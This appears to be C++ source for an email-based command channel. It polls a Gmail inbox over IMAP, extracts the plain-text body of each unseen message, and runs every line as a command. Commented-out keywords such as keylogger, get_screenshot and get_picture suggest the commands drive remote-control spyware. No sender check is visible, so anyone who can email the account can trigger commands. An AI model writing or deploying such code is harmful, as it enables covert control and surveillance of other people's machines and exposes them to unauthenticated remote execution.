#include "checkCommand.h"

string extract_plain_text_from_email(const string& rawEmail) {
  smatch match;

  // Step 1: Extract text/plain section
  regex plainTextRe(R"(Content-Type:\s*text/plain.*?\r\n\r\n([\s\S]*?)\r\n--)",
                    regex::icase);
  if (regex_search(rawEmail, match, plainTextRe)) {
    string body = match[1].str();

    // Trim leading/trailing whitespace
    body.erase(0, body.find_first_not_of(" \r\n"));
    body.erase(body.find_last_not_of(" \r\n") + 1);

    return body;
  }

  // Fallback: if no plain text, attempt whole email body
  return rawEmail;
}

void check_email_commands() {
  CURL* curl = curl_easy_init();
  if (!curl) {
    cerr << "Failed to initialize curl" << endl;
    return;
  }

  // Add this to enable verbose IMAP logging
  curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

  // Set common curl options
  curl_easy_setopt(curl, CURLOPT_USERNAME, gmail_username.c_str());
  curl_easy_setopt(curl, CURLOPT_PASSWORD, app_password.c_str());
  curl_easy_setopt(curl, CURLOPT_USE_SSL, static_cast<long>(CURLUSESSL_ALL));
  curl_easy_setopt(curl, CURLOPT_CAINFO, ca_bundle_path.c_str());
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);

  // Search for unseen emails
  string readBuffer;
  // curl_easy_setopt(curl, CURLOPT_URL,
  // "imaps://imap.gmail.com/INBOX?SEARCH=UNSEEN");
  curl_easy_setopt(curl, CURLOPT_URL, "imaps://imap.gmail.com/INBOX");
  curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "UID SEARCH UNSEEN");
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

  CURLcode res = curl_easy_perform(curl);
  if (res != CURLE_OK) {
    cerr << "Error when searching emails: " << curl_easy_strerror(res) << endl;
    curl_easy_cleanup(curl);
    return;
  }

  // Extract email IDs
  vector<string> ids;
  regex idRegex(R"(\b\d+\b)");
  sregex_iterator it(readBuffer.begin(), readBuffer.end(), idRegex);
  sregex_iterator end;

  for (; it != end; ++it) {
    ids.push_back(it->str());
  }

  if (ids.empty()) {
    cout << "No new emails found." << endl;
    curl_easy_cleanup(curl);
    return;
  }

  // Process each email
  for (const string& id : ids) {
    readBuffer.clear();

    string fetchUrl = "imaps://imap.gmail.com/INBOX/;UID=" + id;
    curl_easy_setopt(curl, CURLOPT_URL, fetchUrl.c_str());
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST,
                     nullptr);  // clear previous custom command

    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

    res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
      cerr << "Failed to fetch email UID " << id << ": "
           << curl_easy_strerror(res) << endl;
      continue;
    }

    // cout << "=== FETCHED RAW EMAIL ===\n"
    //      << readBuffer << "\n=========================\n";
    string decoded = extract_plain_text_from_email(readBuffer);
    cerr << "=== DECODED ===\n" << decoded << "\n=================\n";

    // Process commands
    istringstream iss(decoded);
    string line;
    while (getline(iss, line)) {
      cout << line << '\n';
      // if (line.find("start_program") != string::npos ||
      //     line.find("shutdown") != string::npos ||
      //     line.find("COMMAND") != string::npos ||
      //     line.find("list_program") != string::npos ||
      //     line.find("get_picture") != string::npos ||
      //     line.find("get_screenshot") != string::npos ||
      //     line.find("keylogger") != string::npos)
      execute_command(line);
    }
  }

  curl_easy_cleanup(curl);
}

size_t WriteCallback(char* ptr, size_t size, size_t nmemb, void* userdata) {
  size_t totalSize = size * nmemb;
  string* buffer = static_cast<string*>(userdata);
  buffer->append(ptr, totalSize);
  return totalSize;
}